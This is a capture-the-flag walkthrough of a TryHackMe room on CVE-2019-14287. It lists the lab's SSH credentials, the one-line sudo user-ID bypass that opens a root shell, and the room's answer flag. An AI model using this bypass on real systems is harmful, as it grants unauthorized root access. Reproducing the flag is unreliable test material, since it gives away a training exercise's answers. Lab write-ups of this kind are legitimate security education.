# Sudo Security Bypass | https://tryhackme.com/room/sudovulnsbypass

### [Task 2] Security Bypass

ssh -p 2222 tryhackme@10.10.170.166 
Password : tryhackme 

What can we run with sudo? : `sudo -l`

#1	What command are you allowed to run with sudo? : `/bin/bash`

CVE-2019-14287 : https://nvd.nist.gov/vuln/detail/CVE-2019-14287

In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a "sudo -u \#$((0xffffffff))" command.

so, for root access : `sudo -u \#$((0xffffffff)) /bin/bash`

#2	What is the flag in /root/root.txt? : `THM{l33t_s3cur1ty_bypass}`